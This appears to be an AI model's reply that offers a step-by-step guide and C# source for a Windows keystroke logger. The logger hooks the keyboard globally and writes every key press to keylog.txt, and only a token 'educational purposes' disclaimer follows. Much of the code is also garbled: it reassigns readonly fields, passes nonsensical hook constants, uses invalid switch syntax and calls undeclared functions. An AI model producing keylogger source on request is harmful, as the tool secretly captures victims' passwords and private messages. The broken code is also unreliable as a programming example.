To create a keystroke logger on a Windows computer using C#, you can use keyboard hooking through the Windows API. Here's a step-by-step guide:

### Step 1: Import Necessary Namespaces
Include the required namespaces for Windows API functions and system services.

```csharp
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Threading;
using System.Collections.Generic;
```

### Step 2: Define the Keyboard Hook
Define constants and a delegate for the keyboard hook callback.

```csharp
public class KeyboardLogger
{
    private static int _hook = 0;
    private static readonly IntPtr _hookHandle = IntPtr.Zero;
    private static readonly IntPtr _hwnd = IntPtr.Zero;
    private static readonly uint _companyId = 0x00000110; // Win32 OK key
    private static readonly uint _access = 0x1F;    // Read-only access

    public delegate void KeyPressed(int key, bool isKeyDown);

    public event KeyPressed Key;

    public KeyboardLogger()
    {
        Initialize();
    }

    private void Initialize()
    {
        UninstallHook();
        _hwnd = GetMainWindow();
        _hook = SetWindowsHook();
    }

    private static int GetMainWindow()
    {
        Process myProcess = Process.GetCurrentProcess();
        return myProcess.MainWindow != null ? myProcess.MainWindow.Handle : IntPtr.Zero;
    }

    private static int SetWindowsHook()
    {
        using (HandleInj)
        {
            return SetWindowsHookEx(_companyId, _access, _hwnd, HookCallback, (uint)_hwnd);
        }
    }

    private static IntPtr HandleInj
    {
        get { return (IntPtr)GetWindowThread(_hwnd); }
    }

    private static int HookCallback(int nCode, int wParam, IntPtr lParam)
    {
        if (nCode == 0x110)
        {
            Key?.Invoke(VirtualKeyFromWParam(wParam));
        }
        return 0;
    }

    public static void InstallHook()
    {
        if (_hook != 0)
            return;

        try
        {
            _hook = SetWindowsHook();
            _hwnd = GetMainWindow();
            _hookHandle = SetWindowsHookEx(_companyId, _access, _hwnd, HookCallback, (uint)_hwnd);
        }
        catch (Exception ex)
        {
            throw new Exception("Failed to install keyboard hook: " + ex.Message);
        }
    }

    public static void UninstallHook()
    {
        if (_hook == 0)
            return;

        try
        {
            if (_hookHandle != IntPtr.Zero)
                UnhookWindowsHook(_hookHandle);

            _hook = 0;
        }
        catch (Exception ex)
        {
            throw new Exception("Failed to uninstall keyboard hook: " + ex.Message);
        }
    }

    public static void StartLogging()
    {
        InstallHook();
        new Timer(new TimerCallback(TimerCallback), null, 100, 100).Start();
    }

    public static void StopLogging()
    {
        UninstallHook();
    }

    private static void TimerCallback(object state)
    {
        if (Key == null)
            return;

        using (StreamWriter logFile = new StreamWriter("keylog.txt", true))
        {
            try
            {
                Key?.Invoke((int)ConsoleKeyInfo.VirtualKey);
                logFile.WriteLine("Key pressed: " + ConsoleKeyInfo.VirtualKey);
            }
            catch (Exception)
            {
                // Handle exceptions if needed
            }
        }
    }

    private static int VirtualKeyFromWParam(IntPtr wParam)
    {
        switch (wParam)
        {
            case IntPtr(0x1: return 0);
            case IntPtr(0x2: return 1);
            case IntPtr(0x4: return 2);
            // ... (Add all necessary key mappings)
            default: return 0;
        }
    }

    public static void LogKeystroke(KeyPressedEventArgs e)
    {
        Key?.Invoke(e.Key, e.IsKeyDown);
    }
}
```

### Step 3: Usage Example
To use the `KeyboardLogger`, create an instance and start logging.

```csharp
using System;
using System.Windows.Forms;

public class Form1 : Form
{
    private KeyboardLogger logger;

    public Form1()
    {
        InitializeComponent();
        logger = new KeyboardLogger();
        logger.Key += logger.LogKeystroke;
        logger.StartLogging();
    }

    private void Form1_KeyDown(object sender, KeyEventArgs e)
    {
        logger.LogKeystroke(new KeyPressedEventArgs(e.Key, true));
    }

    private void Form1_KeyUp(object sender, KeyEventArgs e)
    {
        logger.LogKeystroke(new KeyPressedEventArgs(e.Key, false));
    }
}
```

### Explanation:
- **KeyboardLogger Class**: Manages the installation and removal of the keyboard hook. It logs keystrokes to a file named `keylog.txt`.
- **Key events**: The `KeyDown` and `KeyUp` events of the form trigger the logging of each keystroke.
- **Hooking Mechanism**: Uses the Windows API to capture all keyboard events globally, ensuring every key press is logged regardless of the application focus.
- **VirtualKeyInfo**: Converts system messages to their respective key codes for logging.

Note: This code is for educational purposes only. Using keyboard hooking may be restricted in certain environments and should be used ethically. Always ensure you have proper authorization before implementing such functionality.<｜end▁of▁sentence｜>

